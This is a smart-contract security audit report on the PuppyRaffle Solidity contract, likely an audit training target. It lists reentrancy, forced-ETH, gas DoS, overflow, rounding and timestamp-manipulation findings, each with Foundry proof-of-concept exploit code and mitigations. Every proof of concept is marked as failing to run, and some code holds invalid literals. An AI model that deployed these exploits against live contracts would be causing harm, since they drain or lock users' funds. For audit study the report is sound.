# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Pattern


 **Derived From** : refund() is reentrant: sends ETH before clearing player slot, allowing multi-refunds

[H-1]. Reentrancy in PuppyRaffle.refund lets a player contract multi-claim refunds and drain the pot
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : tokenURI returns invalid JSON (rarity value not quoted), breaking ERC721 metadata consumers

[L-2]. ERC721 metadata StandardViolation: tokenURI omits quotes around rarity value, returning invalid JSON
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : withdrawFees uses strict balance==accounting equality; 1 wei donation bricks withdraw

[M-3]. Forced ETH breaks balance==totalFees invariant in PuppyRaffle.withdrawFees, permanently bricking fee withdrawals
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : O(n^2) duplicate check in enterRaffle enables gas-based DoS

[M-4]. enterRaffle’s unbounded nested duplicate scan lets attacker bloat players[] until subsequent entries exceed block gas (DoS)
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : 80/20 split truncates remainder; dust accumulates and blocks fee withdraw

[M-5]. Dust from 80/20 truncation in PuppyRaffle.selectWinner DoSes withdrawFees as balance > totalFees
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : totalFees uses uint64 in Solidity 0.7 causing overflow around 18.4 ETH and broken withdrawals

[H-6]. uint64 fee accumulator overflow in PuppyRaffle.selectWinner desyncs balance==totalFees gate, bricking withdrawFees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : Raffle end relies on block.timestamp; miners can skew timing

[M-7]. Miner/validator can skew block.timestamp to force themselves as winner in PuppyRaffle.selectWinner and steal the pot
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : safeMint/onERC721Received callback can revert and grief selectWinner

[M-8]. selectWinner is DoS-able via untrusted ERC721 receiver hook causing perpetual round finalization failures
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : Pot/fee computed from players.length breaks accounting with refunds, causing DoS/misallocation

[M-9]. selectWinner DoS: prize calculated from players.length exceeds real pot after refunds, making round unfinishable
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests

[M-10]. Fee accounting drift: totalFees over-accrues vs real balance when refunds occur, bricking withdrawFees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : Predictable PRNG uses timestamp/difficulty and caller; winner/rarity biasable

[H-11]. CREATE2 address grinding lets attacker deterministically win PuppyRaffle.selectWinner and siphon 80% of pot
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests



### Number of Findings
- C: 0
- H: 3
- M: 7
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : refund() is reentrant: sends ETH before clearing player slot, allowing multi-refunds

## [H-1]. Reentrancy in PuppyRaffle.refund lets a player contract multi-claim refunds and drain the pot

## Derived From Pattern/Invariant
refund() is reentrant: sends ETH before clearing player slot, allowing multi-refunds

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
refund() performs an external call to the caller via Address.sendValue before clearing the player's slot. Because players[playerIndex] is not zeroed until after the transfer, a contract player can reenter refund(playerIndex) from its receive/fallback multiple times, passing the same requires each time and receiving entranceFee repeatedly. This drains ETH from the contract beyond the single legitimate refund.

Vulnerable snippet:
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, ...);
    require(playerAddress != address(0), ...);

    payable(msg.sender).sendValue(entranceFee); // external call to untrusted contract

    players[playerIndex] = address(0); // effect after interaction
    emit RaffleRefunded(playerAddress);
}

## Impact
An attacker who entered once can reenter refund() in receive() to claim the same refund multiple times, draining the entire raffle pot (all players’ funds) and causing loss of assets.

## Command to Run Test


## Proof of Concept
- Seed the raffle pot with multiple honest players paying entranceFee each.
- Attacker deploys a contract and enters once using its own contract address as a player.
- Attacker calls refund(index) for its slot.
- In the receive() of the attacker contract, while the pot has at least entranceFee and the slot isn't cleared yet, immediately call refund(index) again.
- Because players[index] is updated only after the transfer, every reentry passes the requires and transfers entranceFee again.
- Repeat until the contract balance is insufficient; the pot is drained and the slot is finally cleared.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrantAttacker {
    PuppyRaffle public victim;
    uint256 public entranceFee;
    bool internal attacking;

    constructor(PuppyRaffle _victim, uint256 _entranceFee) {
        victim = _victim;
        entranceFee = _entranceFee;
    }

    function join() external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        victim.enterRaffle{value: msg.value}(arr);
    }

    function attack() external {
        require(!attacking, "already attacking");
        attacking = true;
        uint256 idx = victim.getActivePlayerIndex(address(this));
        victim.refund(idx);
        attacking = false;
    }

    receive() external payable {
        // Re-enter as long as funds remain and our slot hasn't been cleared yet
        if (address(victim).balance >= entranceFee) {
            uint256 idx = victim.getActivePlayerIndex(address(this));
            if (idx != 0) {
                victim.refund(idx);
            }
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle public raffle;
    uint256 public constant ENTRANCE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, address(0xFEE), 1 days);
    }

    function testRefundReentrancyDrainsPot() public {
        vm.deal(address(this), 100 ether);

        // Seed pot with 3 honest players so multiple refunds can be pulled
        address[] memory honest = new address[](3);
        honest[0] = address(0x1);
        honest[1] = address(0x2);
        honest[2] = address(0x3);
        raffle.enterRaffle{value: 3 * ENTRANCE}(honest);

        // Deploy attacker and fund to join once
        ReentrantAttacker attacker = new ReentrantAttacker(raffle, ENTRANCE);
        vm.deal(address(attacker), ENTRANCE);

        // Attacker joins with one ticket
        attacker.join{value: ENTRANCE}();

        uint256 potBefore = address(raffle).balance; // == 4 * ENTRANCE
        uint256 attackerBefore = address(attacker).balance; // == 0 (after join)

        // Execute the attack
        attacker.attack();

        uint256 potAfter = address(raffle).balance;
        uint256 attackerAfter = address(attacker).balance;

        // Pot fully drained and attacker profits beyond a single legitimate refund
        assertEq(potAfter, 0, "raffle pot should be drained");
        assertGt(attackerAfter, attackerBefore, "attacker should profit");
        // Profit should be at least the honest players' contributions (>= 3 * ENTRANCE)
        assertGt(attackerAfter, 2 * ENTRANCE);
        assertEq(potBefore, 4 * ENTRANCE);
    }
}

## Suggested Mitigation
- Apply checks-effects-interactions: set players[playerIndex] = address(0) before sending ETH.
- Optionally add a ReentrancyGuard and mark refund() as nonReentrant.
- Consider using pull-pattern refunds or requiring EOAs only (not recommended as a sole fix). Example fix:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "Only the player can refund");
    require(playerAddress != address(0), "Already refunded");
    players[playerIndex] = address(0); // effects first
    payable(msg.sender).sendValue(entranceFee); // interaction after state change
    emit RaffleRefunded(playerAddress);
}





 **Derived From** : tokenURI returns invalid JSON (rarity value not quoted), breaking ERC721 metadata consumers

## [L-2]. ERC721 metadata StandardViolation: tokenURI omits quotes around rarity value, returning invalid JSON

## Derived From Pattern/Invariant
tokenURI returns invalid JSON (rarity value not quoted), breaking ERC721 metadata consumers

## Exploit Type
StandardViolation

## Location
PuppyRaffle.tokenURI

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
PuppyRaffle.tokenURI builds on-chain JSON but concatenates the rarity string without surrounding quotes, violating the ERC721 Metadata JSON expectations. Many wallets/indexers expect valid JSON; the current output is invalid and can break rendering/listings. Vulnerable snippet:

'"attributes": [{"trait_type": "rarity", "value": ' + rareName + '}], ...'

Correct form:

'"attributes": [{"trait_type": "rarity", "value": "' + rareName + '"}], ...'

## Impact
Functional: Invalid JSON breaks ERC721 metadata consumers (wallets, marketplaces, indexers). Tokens may not render or list correctly, harming UX and integrations.

## Command to Run Test


## Proof of Concept
1) Enter the raffle with 4 distinct addresses and pay entrance fees.
2) Warp time past the raffle duration and call selectWinner() to mint an NFT.
3) Call tokenURI(0), strip the data:application/json;base64, prefix, Base64-decode it.
4) Assert the JSON contains '"value": ' but does NOT contain '"value": "' — proving the rarity string is unquoted and the JSON is invalid.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {Base64} from "../lib/base64/base64.sol";

contract TokenURIStandardViolationTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1 days);
        vm.deal(address(this), 100 ether);
    }

    function test_tokenURI_ReturnsInvalidJSON_UnquotedRarityValue() public {
        // 1) Enter raffle with 4 distinct addresses
        address[] memory entrants = new address[](4);
        entrants[0] = address(0x1);
        entrants[1] = address(0x2);
        entrants[2] = address(0x3);
        entrants[3] = address(0x4);
        raffle.enterRaffle{value: 4 ether}(entrants);

        // 2) Warp time and select winner (will mint tokenId = 0)
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // 3) Fetch tokenURI and decode Base64 JSON
        string memory uri = raffle.tokenURI(0);
        bytes memory uriBytes = bytes(uri);
        uint256 prefixLen = bytes("data:application/json;base64,").length; // 29
        require(uriBytes.length > prefixLen, "unexpected tokenURI format");

        bytes memory base64Part = new bytes(uriBytes.length - prefixLen);
        for (uint256 i = prefixLen; i < uriBytes.length; i++) {
            base64Part[i - prefixLen] = uriBytes[i];
        }

        bytes memory jsonBytes = Base64.decode(string(base64Part));
        string memory json = string(jsonBytes);

        // 4) Assert invalid JSON pattern: value is unquoted
        assertTrue(_contains(json, '"value": '), "missing value field");
        assertFalse(_contains(json, '"value": "'), "rarity value should not be quoted in current buggy output");
    }

    function _contains(string memory where, string memory what) internal pure returns (bool) {
        bytes memory a = bytes(where);
        bytes memory b = bytes(what);
        if (b.length == 0 || b.length > a.length) return false;
        for (uint256 i = 0; i <= a.length - b.length; i++) {
            bool matchAll = true;
            for (uint256 j = 0; j < b.length; j++) {
                if (a[i + j] != b[j]) {
                    matchAll = false;
                    break;
                }
            }
            if (matchAll) return true;
        }
        return false;
    }
}


## Suggested Mitigation
Quote the rarity string in tokenURI. Replace the attributes segment with: abi.encodePacked('"attributes": [{"trait_type": "rarity", "value": "', rareName, '"}], ') to produce valid JSON. Consider using a robust on-chain JSON builder or ensure proper escaping of string values.





 **Derived From** : withdrawFees uses strict balance==accounting equality; 1 wei donation bricks withdraw

## [M-3]. Forced ETH breaks balance==totalFees invariant in PuppyRaffle.withdrawFees, permanently bricking fee withdrawals

## Derived From Pattern/Invariant
withdrawFees uses strict balance==accounting equality; 1 wei donation bricks withdraw

## Exploit Type
ForcedAssetVsStrictEquality

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
withdrawFees requires the contract’s on-chain ETH balance to exactly equal the internal accounting variable totalFees. Because ETH can be forcibly sent via selfdestruct (or any unexpected credit), address(this).balance can exceed totalFees by even 1 wei. From that point onward, the strict equality check fails forever, making fee withdrawals impossible and locking protocol revenue. Vulnerable snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

## Impact
Permanent DoS of fee withdrawals; protocol fees/tresury revenue become locked and cannot be withdrawn by anyone.

## Command to Run Test


## Proof of Concept
1) Attacker deploys a helper contract with a selfdestruct method.
2) After a round ends and totalFees > 0, attacker calls selfdestruct to force-send 1 wei to the raffle contract.
3) Now address(this).balance = totalFees + 1, so withdrawFees reverts on the strict equality check.
4) Future rounds do not fix the mismatch; the extra wei remains, so withdrawals stay bricked permanently.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    function boom(address payable to) external payable {
        selfdestruct(to);
    }
}

contract ForcedEthBricksWithdrawFeesTest is Test {
    PuppyRaffle raffle;
    address fee = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, fee, 1 days);
    }

    function _enter4() internal {
        address[] memory arr = new address[](4);
        arr[0] = address(0x1);
        arr[1] = address(0x2);
        arr[2] = address(0x3);
        arr[3] = address(0x4);
        raffle.enterRaffle{value: 4 ether}(arr);
    }

    function _closeRound() internal {
        vm.warp(raffle.raffleStartTime() + raffle.raffleDuration());
        raffle.selectWinner();
    }

    function test_forcedEthPermanentlyBricksWithdrawFees() public {
        _enter4();
        _closeRound();

        // Sanity: after a normal round, balance == totalFees
        assertEq(address(raffle).balance, uint256(raffle.totalFees()));

        // Attacker forces 1 wei into the contract
        ForceSend fs = new ForceSend();
        address attacker = address(0xA11CE);
        vm.deal(attacker, 1);
        vm.prank(attacker);
        fs.boom{value: 1}(payable(address(raffle)));

        // Invariant broken by forced ETH
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1);

        // Withdraw now reverts
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();

        // Even after another full round, the mismatch persists and withdrawal stays bricked
        _enter4();
        _closeRound();
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1);
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Do not gate withdrawals on strict balance == totalFees. Use balance >= totalFees and transfer only totalFees, or maintain explicit round accounting separate from raw balance. Add a sweepExcess function to send balance - totalFees to a safe address, or ignore unexpected ETH by tracking internal accounting and not enforcing equality. You cannot prevent forced ETH, so code must tolerate it.





 **Derived From** : O(n^2) duplicate check in enterRaffle enables gas-based DoS

## [M-4]. enterRaffle’s unbounded nested duplicate scan lets attacker bloat players[] until subsequent entries exceed block gas (DoS)

## Derived From Pattern/Invariant
O(n^2) duplicate check in enterRaffle enables gas-based DoS

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
enterRaffle pushes all newPlayers into storage, then performs a nested O(n^2) scan across the entire players[] to reject duplicates. Because players[] is user-inflatable and never capped — and refunded slots remain in length — an attacker can prefill players[] with a very large number of unique addresses. This makes each future enterRaffle call perform ~n(n−1)/2 storage reads/comparisons. Once n is large enough, a normal gas-limited transaction cannot complete, so new participants are permanently prevented from entering, degrading protocol liveness and revenue. Vulnerable snippet:

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, ...);
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    // O(n^2) duplicate check over entire players[]
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}

## Impact
Protocol liveness can be bricked at near-zero cost. Because enterRaffle pushes first and only then executes an O(n^2) duplicate scan across the entire players array, any two successful refunds create at least two address(0) entries. Subsequent enterRaffle calls will always revert with “Duplicate player” due to address(0) == address(0), halting new participation and fee accrual until the round is reset. This is a deterministic DoS and does not require large gas or capital outlay. The O(n^2) scan also creates an additional gas-based DoS vector if the array grows large, but the refund-induced duplicate-zero DoS is cheaper and immediate.

## Command to Run Test


## Proof of Concept
1) Attacker initiates a round and causes two entries to be added (can be by any sender, since enterRaffle accepts arbitrary addresses in the array). 2) The two participant addresses then each call refund(playerIndex), which sets their slots in players[] to address(0). 3) Now players[] contains at least two zeros. 4) Any subsequent enterRaffle call will execute the nested duplicate scan over the entire array and hit two zero entries where players[i] == players[j]. The require(players[i] != players[j]) check reverts with “PuppyRaffle: Duplicate player”. 5) This bricks participation for the remainder of the round. If the round already had sufficient players, selectWinner() may also become unreliable as it can pick address(0) and revert on _safeMint, further degrading liveness.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract DuplicateZero_DoS_Test is Test {
    PuppyRaffle pr;
    uint256 constant FEE = 1; // 1 wei to keep test cheap

    function setUp() public {
        vm.deal(address(this), 100 ether);
        pr = new PuppyRaffle(FEE, address(this), 1 days);
    }

    function test_refundCreatesDuplicateZero_DoS() public {
        // 1) Enter with two distinct addresses (any sender can submit arbitrary participants)
        address a1 = address(0xA1);
        address a2 = address(0xA2);
        address[] memory addrs = new address[](2);
        addrs[0] = a1;
        addrs[1] = a2;
        pr.enterRaffle{value: FEE * 2}(addrs);

        // 2) Each participant refunds their own slot, creating two address(0) entries
        vm.prank(a1);
        pr.refund(0);
        vm.prank(a2);
        pr.refund(1);

        // 3) Any subsequent entry will revert due to duplicate address(0) in the global O(n^2) scan
        address[] memory one = new address[](1);
        one[0] = address(0xBEEF);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        pr.enterRaffle{value: FEE}(one);
    }
}


## Suggested Mitigation
- Eliminate the O(n^2) global duplicate scan. Maintain a mapping(address => bool) isActive and a mapping(address => uint256) indexOf for O(1) membership checks.
- Validate a batch before modifying storage: (a) ensure no zero addresses and no duplicates inside newPlayers (use a small local set check or cap batch size), (b) ensure none are already active via isActive mapping. Only then append to players and set isActive + indexOf.
- On refund, perform swap-and-pop to keep players compact (no address(0) holes). Update indexOf for the moved address and set isActive[refunder] = false.
- Optionally cap newPlayers.length per call to a reasonable bound to avoid pathological batch sizes and guarantee predictable gas.





 **Derived From** : 80/20 split truncates remainder; dust accumulates and blocks fee withdraw

## [M-5]. Dust from 80/20 truncation in PuppyRaffle.selectWinner DoSes withdrawFees as balance > totalFees

## Derived From Pattern/Invariant
80/20 split truncates remainder; dust accumulates and blocks fee withdraw

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In selectWinner, prize and fee are computed via integer division: prize=(total*80)/100; fee=(total*20)/100. When totalAmountCollected is not divisible by 5, floor rounding leaves 1 wei dust: total - prize - fee = 1. totalFees only tracks the floored 20%, but the contract retains the dust, so after sending prize, address(this).balance = totalFees + dust. withdrawFees requires strict equality between balance and totalFees and will revert forever once dust exists, blocking fee withdrawals and locking treasury funds.
Vulnerable snippet:
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee       = (totalAmountCollected * 20) / 100;
// leftover = totalAmountCollected - prizePool - fee (1 wei when total%5!=0)

## Impact
Permanent DoS of fee withdrawals; protocol fees remain locked in contract due to address(this).balance > totalFees invariant violation caused by rounding dust.

## Command to Run Test


## Proof of Concept
1) Deploy PuppyRaffle with an entranceFee not divisible by 5 (e.g., 3 wei) and short raffleDuration.
2) Attacker calls enterRaffle with 4 unique addresses, sending 12 wei total.
3) After duration, anyone calls selectWinner. Computation: total=12, prize=floor(12*0.8)=9, fee=floor(12*0.2)=2, dust=1. Contract balance after prize = 3 (2 fees + 1 dust), totalFees=2.
4) Calling withdrawFees reverts because address(this).balance (3) != totalFees (2). The 1 wei dust permanently blocks fee withdrawal across rounds, accumulating if repeated.

## Proof of Code
pragma solidity ^0.8.18;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PrecisionDustBlocksWithdraw is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);
    address attacker = address(0xBEEF);

    function setUp() public {
        // entranceFee intentionally not divisible by 5 to create dust
        raffle = new PuppyRaffle(3, feeAddr, 1);
        vm.deal(attacker, 1 ether);
    }

    function test_dustBlocksWithdrawFees() public {
        // Prepare 4 unique entrants (>= 4 required)
        address[] memory entrants = new address[](4);
        entrants[0] = address(0x1);
        entrants[1] = address(0x2);
        entrants[2] = address(0x3);
        entrants[3] = address(0x4);

        // Pay 12 wei total (4 * 3 wei)
        vm.deal(attacker, 12);
        vm.prank(attacker);
        raffle.enterRaffle{value: 12}(entrants);

        // Let raffle end
        vm.warp(block.timestamp + raffle.raffleDuration() + 1);

        // Anyone selects winner
        vm.prank(address(0xCAFE));
        raffle.selectWinner();

        // total=12, prize=9, fee=2, dust=1 => balance=3, totalFees=2
        assertEq(address(raffle).balance, 3);
        assertEq(uint256(raffle.totalFees()), 2);

        // Withdraw reverts because balance != totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Ensure no dust remains by computing one side from the other: fee = totalAmountCollected / 5; prizePool = totalAmountCollected - fee; or prizePool = (totalAmountCollected * 4) / 5; fee = totalAmountCollected - prizePool. This assigns the entire total (no remainder) deterministically.
- Alternatively, add the remainder to either prize or fee explicitly: uint256 fee = (total*20)/100; uint256 prize = total - fee; or uint256 prize = (total*80)/100; uint256 fee = total - prize.
- Relax withdrawFees gating to allow balance >= totalFees and send only totalFees, leaving harmless dust, but best practice is to eliminate dust at source.





 **Derived From** : totalFees uses uint64 in Solidity 0.7 causing overflow around 18.4 ETH and broken withdrawals

## [H-6]. uint64 fee accumulator overflow in PuppyRaffle.selectWinner desyncs balance==totalFees gate, bricking withdrawFees

## Derived From Pattern/Invariant
totalFees uses uint64 in Solidity 0.7 causing overflow around 18.4 ETH and broken withdrawals

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
totalFees is a uint64 and fee is cast to uint64 in Solidity 0.7 (unchecked). On a large round or cumulative accrual, the cast truncates fee modulo 2^64 and the addition silently overflows. After selectWinner transfers 80% to the winner, 20% remains in the contract, but totalFees is now smaller than the actual ETH balance. The withdrawal gate require(address(this).balance == uint256(totalFees)) will never pass again, permanently locking fees. Vulnerable snippet:

uint64 public totalFees = 0;
...
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee); // unchecked/truncates
...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
An attacker can trigger an overflow with a single large round (e.g., 100 players at 1 ETH -> 20 ETH fee > 2^64-1 wei), causing totalFees to underreport and permanently revert withdrawFees(). Protocol fees are stuck forever (DoS of treasury withdrawals).

## Command to Run Test


## Proof of Concept
1) Attacker funds the raffle with many unique addresses to push pot high enough such that fee >= 2^64 wei (e.g., 100 ETH pot -> 20 ETH fee).
2) Call selectWinner after duration. Prize (80 ETH) is paid out, 20 ETH remains as protocol fee in the contract.
3) totalFees overflows due to uint64 cast and becomes much smaller than 20 ETH.
4) withdrawFees() reverts on the equality gate since address(this).balance > totalFees with no active players, permanently bricking fee withdrawals.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract AccountingInvariantViolationTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);
    address attacker = address(0xA11CE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddr, 1);
        vm.deal(attacker, 200 ether);
    }

    function test_totalFeesUint64OverflowLocksWithdrawFees() public {
        // Build 100 unique players so total pot = 100 ETH, fee = 20 ETH (> 2^64-1 wei ~ 18.4 ETH)
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(uint160(i + 1));
        }

        vm.prank(attacker);
        raffle.enterRaffle{value: 100 ether}(players);

        // Advance time so raffle can be settled
        vm.warp(block.timestamp + 2);

        // Anyone can settle
        vm.prank(attacker);
        raffle.selectWinner();

        // After settlement, 20 ETH fee remains in contract
        assertEq(address(raffle).balance, 20 ether);

        // totalFees is stored as uint64 and has truncated/overflowed
        uint64 tf = raffle.totalFees();
        assertGt(20 ether, uint256(tf)); // balance > recorded fees due to overflow

        // With no active players (players array was deleted), withdrawFees should be callable,
        // but the equality gate is now permanently false -> revert
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Store fees in a wide type and avoid truncation. Change totalFees to uint256 and perform safe arithmetic (in 0.7 use SafeMath or migrate to 0.8). Remove/moderate the fragile equality gate: instead gate on players.length == 0 or track active deposits separately. Example fix: uint256 public totalFees; ... uint256 fee = (totalAmountCollected * 20) / 100; totalFees = totalFees + fee; and in withdrawFees require(players.length == 0, "Players active");





 **Derived From** : Raffle end relies on block.timestamp; miners can skew timing

## [M-7]. Miner/validator can skew block.timestamp to force themselves as winner in PuppyRaffle.selectWinner and steal the pot

## Derived From Pattern/Invariant
Raffle end relies on block.timestamp; miners can skew timing

## Exploit Type
TimestampManipulation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
selectWinner gates on block.timestamp >= raffleStartTime + raffleDuration and uses block.timestamp inside the RNG: winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;. A block producer (miner/validator) can: (1) choose when the function becomes callable by advancing the timestamp within protocol tolerance, and (2) in the same block, pick a timestamp that makes the hash modulo map to an index they control in players[]. This lets them deterministically finalize the round with themselves as winner once they have at least one entry, converting other players’ deposits into their own payout (80% of the pot). Vulnerable snippet: require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over"); and winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;.

## Impact
A colluding block producer can deterministically select themselves as the winner to capture 80% of the prize pool, overriding fair odds and stealing other players’ funds.

## Command to Run Test


## Proof of Concept
1) Attacker joins the raffle once; three honest users also join (4 total). 2) When raffleDuration has elapsed, the attacker proposes the next block (or bribes the proposer) and tries candidate timestamps within allowed skew for that block until keccak256(attackerCaller, chosenTimestamp, block.difficulty) % 4 equals attacker’s index in players[]. 3) In that same block, include attacker’s selectWinner() tx with the chosen timestamp. 4) The require passes, winnerIndex resolves to attacker’s slot, 80% of the entire pot is transferred to attacker’s player address.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract TimestampBiasWinTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    address feeSink = address(0xFEE);
    address v1 = address(0x1001);
    address v2 = address(0x1002);
    address v3 = address(0x1003);
    address attackerPlayer = address(0xBEEF);    // address in players[] that will receive prize
    address attackerCaller = address(0xCA11ER);  // msg.sender that calls selectWinner()

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeSink, 1 days);
        // 3 honest users enter
        _enter(v1);
        _enter(v2);
        _enter(attackerPlayer); // attacker also enters once (index 2 in players[] given order)
        _enter(v3);
    }

    function _enter(address p) internal {
        vm.deal(p, FEE);
        address[] memory arr = new address[](1);
        arr[0] = p;
        vm.prank(p);
        raffle.enterRaffle{value: FEE}(arr);
    }

    function test_MEVTimestampBias_ForcesAttackerWin() public {
        // Fast-forward to just after raffle end
        uint256 endTime = raffle.raffleStartTime() + raffle.raffleDuration();
        vm.warp(endTime);

        // Fix a known difficulty so we can search a timestamp locally (simulates block producer knowledge)
        vm.difficulty(123456);

        // Attacker aims to hit index 2 (attackerPlayer) with msg.sender = attackerCaller
        uint256 targetIndex = 2; // based on the entry order above
        uint256 chosenTs = 0;
        bool found = false;
        for (uint256 i = 0; i < 600; i++) { // search small skew window
            uint256 t = endTime + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(attackerCaller, t, uint256(123456)))) % 4;
            if (idx == targetIndex) {
                chosenTs = t;
                found = true;
                break;
            }
        }
        assertTrue(found, "No suitable timestamp found in search window");

        // Propose block with the chosen timestamp and call selectWinner from attackerCaller
        vm.warp(chosenTs);
        vm.deal(attackerCaller, 1 ether);
        uint256 pre = attackerPlayer.balance;

        vm.prank(attackerCaller);
        raffle.selectWinner();

        // Assert attacker won and received 80% of the 4-ticket pot
        uint256 expectedPrize = (4 * FEE * 80) / 100; // 3.2 ether
        assertEq(raffle.previousWinner(), attackerPlayer);
        assertEq(attackerPlayer.balance - pre, expectedPrize);
    }
}


## Suggested Mitigation
